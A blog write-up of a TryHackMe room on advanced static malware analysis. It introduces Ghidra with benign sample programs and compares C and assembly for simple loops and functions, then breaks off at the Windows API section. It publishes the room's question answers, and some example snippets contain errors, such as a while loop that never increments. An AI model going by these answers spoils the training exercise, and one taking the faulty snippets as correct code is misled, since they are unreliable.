<!DOCTYPE html> <html lang="en"> <head> <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <title> THM Advanced Static Analysis | NonoHM </title> <meta name="author" content="NonoHM "> <meta name="description" content="Welcome to my personnal website. I am currently a 2nd year student in the " but r et t program. i like doing sports and music besides learning new things in it.> <meta name="keywords" content="jekyll, jekyll-theme, portfolio-website, writeups, projects"> <link rel="stylesheet" href="/assets/css/bootstrap.min.css?a4b3f509e79c54a512b890d73235ef04"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/css/mdb.min.css" integrity="sha256-jpjYvU3G3N6nrrBwXJoVEYI/0zw8htfFnhT9ljN3JJw=" crossorigin="anonymous"> <link defer rel="stylesheet" href="/assets/css/academicons.min.css?f0b7046b84e425c55f3463ac249818f5"> <link defer rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:100,300,400,500,700|Material+Icons&amp;display=swap"> <link defer rel="stylesheet" href="/assets/css/jekyll-pygments-themes-github.css?591dab5a4e56573bf4ef7fd332894c99" media="" id="highlight_theme_light"> <link defer href="/assets/css/bootstrap-toc.min.css?6f5af0bb9aab25d79b2448143cbeaa88" rel="stylesheet"> <link rel="shortcut icon" href="data:image/svg+xml,&lt;svg%20xmlns=%22http://www.w3.org/2000/svg%22%20viewBox=%220%200%20100%20100%22&gt;&lt;text%20y=%22.9em%22%20font-size=%2290%22&gt;%E2%9A%9B%EF%B8%8F&lt;/text&gt;&lt;/svg&gt;"> <link rel="stylesheet" href="/assets/css/main.css?d41d8cd98f00b204e9800998ecf8427e"> <link rel="canonical" href="https://nonohm.github.io/blog/2024/THM-Advanced-Static-Analysis/"> <link defer rel="stylesheet" href="/assets/css/jekyll-pygments-themes-native.css?5847e5ed4a4568527aa6cfab446049ca" media="none" id="highlight_theme_dark"> <script src="/assets/js/theme.js?0afe9f0ae161375728f7bcc5eb5b4ab4"></script> </head> <body class="fixed-top-nav "> <header> <nav id="navbar" class="navbar navbar-light navbar-expand-sm fixed-top" role="navigation"> <div class="container"> <a class="navbar-brand title font-weight-lighter" href="/"> NonoHM </a> <button class="navbar-toggler collapsed ml-auto" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar top-bar"></span> <span class="icon-bar middle-bar"></span> <span class="icon-bar bottom-bar"></span> </button> <div class="collapse navbar-collapse text-right" id="navbarNav"> <ul class="navbar-nav ml-auto flex-nowrap"> <li class="nav-item "> <a class="nav-link" href="/">about </a> </li> <li class="nav-item "> <a class="nav-link" href="/blog/">blog </a> </li> <li class="nav-item "> <a class="nav-link" href="/projects/">projects </a> </li> <li class="nav-item "> <a class="nav-link" href="/repositories/">repositories </a> </li> <li class="toggle-container"> <button id="light-toggle" title="Change theme"> <i class="fa-solid fa-moon"></i> <i class="fa-solid fa-sun"></i> </button> </li> </ul> </div> </div> </nav> <progress id="progress" value="0"> <div class="progress-container"> <span class="progress-bar"></span> </div> </progress> </header> <div class="container mt-5" role="main"> <div class="row"> <div class="col-sm-3"> <nav id="toc-sidebar" class="sticky-top"></nav> </div> <div class="col-sm-9"> <div class="post"> <header class="post-header"> <h1 class="post-title">THM Advanced Static Analysis</h1> <p class="post-meta"> June 21, 2024 • NonoHM </p> <p class="post-tags"> <a href="/blog/2024"> <i class="fa-solid fa-calendar fa-sm"></i> 2024 </a>   ·   <a href="/blog/tag/thm"> <i class="fa-solid fa-hashtag fa-sm"></i> THM</a>   <a href="/blog/tag/malware-analysis"> <i class="fa-solid fa-hashtag fa-sm"></i> Malware Analysis</a>   <a href="/blog/tag/re"> <i class="fa-solid fa-hashtag fa-sm"></i> RE</a>   <a href="/blog/tag/static-analysis"> <i class="fa-solid fa-hashtag fa-sm"></i> Static Analysis</a>   </p> </header> <article class="post-content"> <div id="markdown-content"> <h2 id="task-1---introduction">Task 1 - Introduction</h2> <p>Unlike in <a href="https://tryhackme.com/room/staticanalysis1" rel="external nofollow noopener" target="_blank">Basic Static Analysis</a> where we looked more at the characteristics of malware, like strings, hashes, import functions, and other key information; in Advanced Static Analysis, we will dig further by analyzing disassembled code and the associated assembly instructions.</p> <p>Advanced static analysis is a technique used to analyze the code and structure of malware without executing it, in order to identify the malware’s behavior and weaknesses.</p> <h3 id="learning-objectives">Learning Objectives</h3> <p>Some of the topics that are covered in this room are:</p> <ul> <li>Understand how advanced static analysis is performed.</li> <li>Exploring Ghidra’s disassembler functionality.</li> <li>Understanding and identifying different C constructs in assembly.</li> </ul> <h2 id="task-2---malware-analysis---overview">Task 2 - Malware Analysis - Overview</h2> <p>To begin with, malware analysis is the fact of examining malicious software (malware) to understand how it works and identify its capabilities, behavior and potential impact. There are four main steps in analyzing malware:</p> <ol> <li>Basic static analsis</li> <li>Basic dynamic analysis</li> <li>Advanced static analysis</li> <li>Advances dynamic analysis</li> </ol> <p>Each step uses different tools and techniques to gather information about the malware.</p> <h3 id="static-analysis">Static Analysis</h3> <p>Static analysis aims to understand the malware’s structure and behavior without executing it. Basic analysis involves examining the malware’s code, file headers and other simple static properties. Advanced analysis, on the other hand, aims to uncover hidden or obfuscated code and functionality within the malware. This involves more advanced techniques to analze the malware’s code, such as deobfuscation and code emulation.</p> <h3 id="dynamic-analysis">Dynamic Analysis</h3> <p>Dynamic analysis aims to observe the malware’s behavior during execution in a controlled environment. Basic analysis involves executing the malware in a sandbox or virtual machine and monitoring its system activity, network traffic and process behavior. Advanced analysis seeks to uncover more complex and evasive malware behiavor using advanced monitoring techniques with more sophisticated sandboxed and monitoring tools to capture it in greater detail.</p> <h3 id="how-advanced-static-analysis-is-performed-">How Advanced Static Analysis is Performed ?</h3> <p>Advanced static analysis is a crucial process for understanding its behavior and identifying its potential threats. The key objectives are to discover the malware’s capabilities, identify its attack vectors and determine the evasion techniques.</p> <p>To perform this type of analysis, dissasemblers such as IDA Pro, Binary ninja and radare2 are commonly used. These disassemblers allow the analyst to explore the malware’s assembly code/pseudo-c code and identify the functions and data structures.</p> <p>The steps involved are as follows:</p> <ol> <li>Identify the entry point of the malware and the system calls it makes.</li> <li>Identify the malware’s code sections and analyze them using available tools such as debuggers and hex editors.</li> <li>Analyze the malware’s control flow graph to identify its execution path.</li> <li>Trace the malware’s dynamic behavior by analyzing the system calls it makes during execution.</li> <li>Use the above information to understand the malware’s evasion techniques and the potential damage it can cause.</li> </ol> <h3 id="questions">Questions</h3> <p><strong>Does advanced static analysis require executing the malware in a controlled environment? (yay/nay)</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">nay</code></em></p> <h2 id="task-4---ghidra-a-quick-overview">Task 4 - Ghidra: A Quick Overview</h2> <p>Many disassemblers like cutter, ghidra, radare2 ans IDA Pro can be used to disassemble any type of program. However, we will explore Ghidra because it’s free, open-source and has many features that can be utilized to get proficient in reverse engineering. The objective is to get comfortable with the main usage of a disassembler and use that knowledge to any others.</p> <p>Ghidra includes many features that make it a powerful reverse engineering tool. Some of these features include:</p> <ul> <li> <strong>Decompilation</strong>: Ghidra can decompile binaries into readable C code, making it easier for developers to understand how the software works.</li> <li> <strong>Disassembly</strong>: Ghidra can disassemble binaries into assembly language, allowing analysts to examine the low-level operations of the code.</li> <li> <strong>Debugging</strong>: Ghidra has a built-in debugger that allows users to step through code and examine its behavior.</li> <li> <strong>Analysis</strong>: Ghidra can automatically identify functions, variables, and other code to help users understand the structure of the code.</li> </ul> <h3 id="how-to-use-ghidra-for-analysis">How to use Ghidra for Analysis</h3> <p>Here, we will explore Ghidra and its features by analyzing the <code class="language-plaintext highlighter-rouge">HelloWorld.exe</code> sample.</p> <p>To begin with, open <em>Ghidra</em> and create a new project</p> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/BySFLlIUA.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Step 1 Ghidra" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> <p>Secondly, select <em>Non-Shared Project</em>. <em>Shared Project</em> is to allow us to share our analysis with other analysts.</p> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/H1mRUgIUR.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Step 2 Ghidra" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> <p>Then, name the project accordingly to our binary.</p> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/rycGwxLUC.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Step 3 Ghidra" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> <p>When the window <em>Active Project</em> is shown, drag and drop <code class="language-plaintext highlighter-rouge">HelloWorld.exe</code> or <code class="language-plaintext highlighter-rouge">File -&gt; Import File</code> to begin the program’s analysis.</p> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/BkrcuxI8R.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Step 4 Ghidra" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> <p>Once it is imported, we get the program’s summary as shown below:</p> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/HyslFlILC.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Program Summary" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> <p>After that, double-click on <strong>HelloWorld.exe</strong> or click on the dragon icon to open the <em>CodeBrowser</em> and re-import the file. When asked to analyze the executable, click on <strong>Yes</strong>.</p> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/H1eHcx8UA.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Open CodeBrowser" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/ryl59gULR.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Analyze the sample" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> <p>The next window that appears show us various analysis option. We can check or uncheck them based on our needs. These add-ons assist Ghidra during analysis.</p> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/SJtmoe8UA.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Analysis options" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> <p>It will take some time to analyze. The bottom bar show the current progress.</p> <h3 id="exploring-the-ghidra-layout">Exploring the Ghidra Layout</h3> <p>Ghidra has so many options to aid in our analysis. The default layout is shown and explained briefly below.</p> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/ByniixL8A.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Ghidra Layout" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> <ol> <li> <strong>Program Trees:</strong> Show the sections of the program. We can click on different sections to see the content within each. The <a href="https://tryhackme.com/room/dissectingpeheaders" rel="external nofollow noopener" target="_blank">Dissecting PE Headers</a> room explain headers and PE Sections in depth.</li> <li> <strong>Symbol Tree:</strong> Contains important sections like Imports, Exports and Functions. Each seciton provides a wealth of information about the program we are analyzing. <ul> <li> <strong>Imports:</strong> This section contains information about the libraries being imported by te program. Clicking on each API call shows the assembly code that uses that API.</li> <li> <strong>Exports:</strong> This section contains the API/function calls being exported by the program. This section is useful when analyzing a DLL, as it will show all the functions it contains.</li> <li> <strong>Functions:</strong> This section contains the functions it finds within the code. Clicking on each function will take us to the disassembled code of that function. It also contains the entry function. Clicking on the <em>entry</em> function will take us to the start of the program we are analyzing. Functions with generic names starting with <code class="language-plaintext highlighter-rouge">FUN_VirtualAddress</code> are the ones that Gidra does not give any names to.</li> </ul> </li> <li> <strong>Data Type Manager:</strong> This section shows various data types found in the program.</li> <li> <strong>Listing:</strong> This window show the dissassembled code of the binary, which included the following values in order: <ul> <li>Virtual Address</li> <li>Opcode</li> <li>Assembly Instrcution (<em>PUSH</em>, <em>POP</em>, <em>ADD</em>, <em>XOR</em>, etc…)</li> <li>Operands</li> <li>Comments</li> </ul> </li> <li> <strong>Decompile:</strong> Ghidra translates the assembly code into a pseudo C code here. This is a very important section to look at during analysis as it gives a better understanding of the assembly code.</li> <li> <strong>Toolbar:</strong> Various options to use during the analysis.</li> </ol> <ul> <li> <strong>Graph View:</strong> The Graph View in the toolbar is an important option, allowing us to see the graph view of the disassembly.</li> </ul> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/SJpdkWL8C.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Main function Graph" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> <ul> <li> <strong>The Memory Map</strong> option shows the memory mapping of the program as shown below:</li> </ul> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/H1cq1-IUC.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Memory Map" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> <ul> <li>This navigation toolbar shows different options to navigate through the code.</li> </ul> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/ByPel-880.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Toolbar" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> <ul> <li>To explore strings, go to <code class="language-plaintext highlighter-rouge">Search -&gt; For Strings</code> and click <em>Search</em> will give us the strings that Ghidra finds withing the binary. This window can contain important information to help us.</li> </ul> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/H1-8xWLUA.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="String Search Window" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> <h3 id="analyzing-helloworld-in-assembly">Analyzing HelloWorld in Assembly</h3> <p>There are many ways to reach the code of interest. To find the assembly code for <strong>HelloWorld.exe</strong>, we will go for a String Search to see where is our string <em>Hello World</em>.</p> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/HJNbtZUL0.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Hello World decompiled" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> <p>The search has returned the code block of the MessageBox call using the <em>Hello World</em> string. We may notice that the main function is filled with compiler things.</p> <p>We explored Ghidra and its features in this task by examining a simple “HelloWorld” program. In the next task, we will use this knowledge to explore different C constructs and their corresponding representations in assembly.</p> <blockquote> <p><strong>Note:</strong> It is trivial to note that the malware’s author may have packed it or used obfuscation or Anti VM / AV detection techniques to make the analysis harder. These techniques will be discussed in the coming rooms.</p> </blockquote> <h3 id="questions-1">Questions</h3> <p><strong>How many function calls are present in the Exports section?</strong></p> <p>The only exported function is called <em>entry</em>. However, this is not our main function like depicted above.</p> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/r14zqWUUR.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="HelloWorld exports" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> <p><em>Answer: <code class="language-plaintext highlighter-rouge">1</code></em></p> <p><strong>What is the only API call found in the User32.dll under the Imports section?</strong></p> <p>The only API call for <em>User32.dll</em> is the <code class="language-plaintext highlighter-rouge">MessageBoxA</code> function.</p> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/S17O5-LLC.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="MessageBoxA import" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> <p><em>Answer: <code class="language-plaintext highlighter-rouge">MessageBoxA</code></em></p> <p><strong>How many times can the “Hello World” string be found with the Search for Strings utility?</strong></p> <p>Like shown before, the <em>Hello World</em> string is only found one time in the <code class="language-plaintext highlighter-rouge">Search -&gt; For Strings</code> menu.</p> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/ry_yjZIUC.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="String Search" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> <p><em>Answer: <code class="language-plaintext highlighter-rouge">1</code></em></p> <p><strong>What is the virtual address of the CALL function that displays “Hello World” in a messagebox?</strong></p> <p>By double-clicking on the <em>Code Unit</em> case of the string search, we can go to the location of the string <em>Hello World</em>.</p> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/BJJDh-LUA.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Hello World string" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> <p>Once that is done, double-clicking on the parent function (XREF), we are welcomed with the disassembly of the main function, containing <code class="language-plaintext highlighter-rouge">MessageBoxA</code>.</p> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/BJK23WLIR.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="MessageBoxA function call" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> <p><em>Answer: <code class="language-plaintext highlighter-rouge">004073d7</code></em></p> <h2 id="task-5---identifying-c-code-constructs-in-assembly">Task 5 - Identifying C Code Constructs in Assembly</h2> <p>Analyzing assembly code of compiled binaries can be overwhelming for beginners. That is why understanding assembly instructions and how various programming components are translated into assembly is important.</p> <p>We are loading components of the <code class="language-plaintext highlighter-rouge">Code_Constructs</code> into Ghidra.</p> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/BkxJZuAP0.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Code_Constructs in Ghidra" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> <p>There are different approaches to begin analyzing the code:</p> <ul> <li>Locate the main function from the <strong>Symbol Tree</strong> section.</li> <li>Check the <strong>.text</strong> code from the <strong>Program Trees</strong> section to see the ode section and find the entry point.</li> <li>Search for interesting <strong>strings</strong> and locate the code from where those are referenced.</li> </ul> <blockquote> <p><strong>Note:</strong> Different compilers add their own code for various checks while compiling. Therefore expect some garbage assembly code that does not make sense.</p> </blockquote> <h3 id="code-hello-world">Code: Hello World</h3> <p><strong>In C language</strong></p> <p>The <em>Hello World</em> program is one of the most basic program to try out a new language.</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span>
<span class="kt">int</span> <span class="n">main</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Hello World</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div> <p><strong>In Assembly</strong></p> <pre><code class="language-asm">section .data 
    message db 'HELLO WORLD!!', 0 ; Defines the string "HELLO WORLD!!" followed by a null byte in memory

section .text
    global _start

_start:
    ; write the message to stdout
    mov eax, 4      ; write system call
    mov ebx, 1      ; file descriptor for stdout
    mov ecx, message    ; pointer to message
    mov edx, 13     ; message length
    int 0x80        ; call kernel
</code></pre> <p>This program defines a string “HELLO WORLD!!” in the .data section and then uses the write system call to print the string to stdout.</p> <p><strong>In Ghidra</strong></p> <p>The <em>Hello World</em> code can be found by doing a string search.</p> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/S1Xar9RPC.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="String Search" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/BJmGLqAwA.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="First occurence" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/BJiNIcAD0.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Main function" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> <p>We know that function is the main function, hence we can rename our function on the <em>decompiler</em> section.</p> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/Sk408q0PR.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Typed main" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> <h3 id="code-for-loop">Code: For Loop</h3> <p><strong>In C Language</strong></p> <p>A For loop permit to repeat certain instructions until it completes.</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
    <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
    <span class="k">for</span> <span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="mi">5</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="n">i</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div> <p><strong>In Assembly</strong></p> <pre><code class="language-asm">main:
    ; initialize loop counter to 0
    mov ecx, 0

    ; loop 5 times
    mov edx, 5
loop:
    ; print the loop counter
    push ecx
    push format
    call printf
    add esp, 8

    ; increment loop counter
    inc ecx

    ; check if the loop is finished
    cmp ecx, edx
    jl loop
</code></pre> <p><strong>In Ghidra</strong></p> <p>The <code class="language-plaintext highlighter-rouge">for-loop.exe</code> is the program which contains the loop code.</p> <p>This is its behaviour:</p> <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\Administrator\Desktop\Code_Constructs</span><span class="err">&gt;</span><span class="w"> </span><span class="o">.</span><span class="nx">\for-loop.exe</span><span class="w">
</span><span class="n">This</span><span class="w"> </span><span class="nx">program</span><span class="w"> </span><span class="nx">demonstrates</span><span class="w"> </span><span class="nx">FOR</span><span class="w"> </span><span class="nx">loop</span><span class="w"> </span><span class="nx">statement</span><span class="w">
</span><span class="n">THM_IS_Fun_to_Learn</span><span class="w">
</span><span class="nx">THM_IS_Fun_to_Learn</span><span class="w">
</span><span class="n">THM_IS_Fun_to_Learn</span><span class="w">
</span><span class="nx">THM_IS_Fun_to_Learn</span><span class="w">
</span><span class="n">THM_IS_Fun_to_Learn</span><span class="w">
</span><span class="nx">THM_IS_Fun_to_Learn</span><span class="w">
</span><span class="n">THM_IS_Fun_to_Learn</span><span class="w">
</span><span class="nx">THM_IS_Fun_to_Learn</span><span class="w">
</span><span class="n">THM_IS_Fun_to_Learn</span><span class="w">
</span><span class="nx">THM_IS_Fun_to_Learn</span><span class="w">
</span><span class="n">THM_IS_Fun_to_Learn</span><span class="w">
</span></code></pre></div></div> <p>On Ghidra, we can get the main function a bit after the entry point. Moreover, we get the decompiled pseudo-C code of the for loop.</p> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/rklzoazuC.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Ghidra for loop" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> <h3 id="code-function">Code: Function</h3> <p><strong>In C Language</strong></p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">add</span><span class="p">(</span><span class="kt">int</span> <span class="n">a</span><span class="p">,</span> <span class="kt">int</span> <span class="n">b</span><span class="p">){</span>
    <span class="kt">int</span> <span class="n">result</span> <span class="o">=</span> <span class="n">a</span> <span class="o">+</span> <span class="n">b</span><span class="p">;</span>
    <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div> <p><strong>In Assembly</strong></p> <pre><code class="language-asm">add:
    push ebp          ; save the current base pointer value
    mov ebp, esp      ; set base pointer to current stack pointer value
    mov eax, dword ptr [ebp+8]  ; move the value of 'a' into the eax register
    add eax, dword ptr [ebp+12] ; add the value of 'b' to the eax register
    mov dword ptr [ebp-4], eax  ; move the sum into the 'result' variable
    mov eax, dword ptr [ebp-4]  ; move the value of 'result' into the eax register
    pop ebp           ; restore the previous base pointer value
    ret               ; return to calling function
</code></pre> <p>The add function starts by saving the current base pointer value onto the stack. Then, it sets the base pointer to the current stack pointer value. The function then moves the values of <em>a</em> and <em>b</em> into the <em>eax</em> register, adds them, and store the result in the <em>result</em> variable. Finally, the function moves the value of the result into the <em>eax</em> register, restores the previous base pointer value, and returns to the calling function.</p> <h3 id="code-while-loop">Code: While loop</h3> <p><strong>In C Language</strong></p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="k">while</span> <span class="p">(</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mi">10</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"%d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">i</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div> <p><strong>In Assembly</strong></p> <pre><code class="language-asm">mov ecx, 0     ; initialize i to 0
loop_start:
cmp ecx, 10    ; compare i to 10
jge loop_end   ; jump to loop_end if i &gt;= 10
push ecx       ; save the value of i on the stack
push format    ; push the format string for printf
push dword [ecx]; push the value of i for printf
call printf    ; call printf to print the value of i
add esp, 12    ; clean up the stack
inc ecx        ; increment i
jmp loop_start ; jump back to the start of the loop
loop_end:
</code></pre> <p><strong>In Ghidra</strong></p> <p>Using the provided program, Ghidra seems to interpret the while loop as a for loop one. This is maybe due also on how has compiled the source code.</p> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/By4qVAGOC.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Ghidra while loop" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> <p>This is how it should look like:</p> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/SkI6ECM_A.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Ghidra while loop ok" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> <p><strong>Task: Examine the if-else.exe and while-loop.exe and answer the questions below.</strong></p> <h3 id="questions-2">Questions</h3> <p><strong>What value gets printed by the while loop in the while-loop.exe program?</strong></p> <p>We can run the program or look at what data gets <em>printf</em>.</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">_puts</span><span class="p">(</span><span class="s">"_ITs_Fun_to_Learn_at_THM_"</span><span class="p">);</span>
</code></pre></div></div> <p><em>Answer: <code class="language-plaintext highlighter-rouge">_ITs_Fun_to_Learn_at_THM_</code></em></p> <p><strong>How many times, the while loop will run until the condition is met?</strong></p> <p>From the decompiled code, this is what we get:</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="k">for</span> <span class="p">(</span><span class="n">local_14</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="n">local_14</span> <span class="o">&lt;</span> <span class="mi">5</span><span class="p">;</span> <span class="n">local_14</span> <span class="o">=</span> <span class="n">local_14</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">_puts</span><span class="p">(</span><span class="s">"_ITs_Fun_to_Learn_at_THM_"</span><span class="p">);</span>
  <span class="p">}</span>
</code></pre></div></div> <p><em>Answer: <code class="language-plaintext highlighter-rouge">4</code></em></p> <p><strong>Examine the while-loop.exe in Ghidra. What is the virtual address of the instruction, that CALLS to print out the sentence “That’s the end of while loop ..”?</strong></p> <p>For this question, we need to check where the call for the <em>printf</em> function is made:</p> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/BJg9LCzdA.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="printf end of the wile loop" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> <p><em>Answer: <code class="language-plaintext highlighter-rouge">00401543</code></em></p> <p><strong>In the if-else.exe program, examine the strings and complete the sentence “This program demonstrates………..”</strong></p> <p>Here, we can use the <em>String Search</em> function of Ghidra:</p> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/B1g9DAzOA.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="String if-else" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> <p><em>Answer: <code class="language-plaintext highlighter-rouge">This program demonstrates if-else statement </code></em></p> <p><strong>What is the virtual address of the CALL to the main function in the if-else.exe program?</strong></p> <p>This information is contained at the line of <code class="language-plaintext highlighter-rouge">_main()</code>:</p> <figure> <picture> <img src="/assets/img/images/thm_advanced_static_analysis/By0fdAz_R.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="_main() function call" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> <p><em>Answer: <code class="language-plaintext highlighter-rouge">00401509</code></em></p> <h2 id="task-6---an-overview-of-windows-api-calls">Task 6 - An Overview of Windows API Calls</h2> <p>The Windows API is a collection of functions and services to enable developers to create Windows applications.</p> <h3 id="create-process-api">Create Process API</h3> 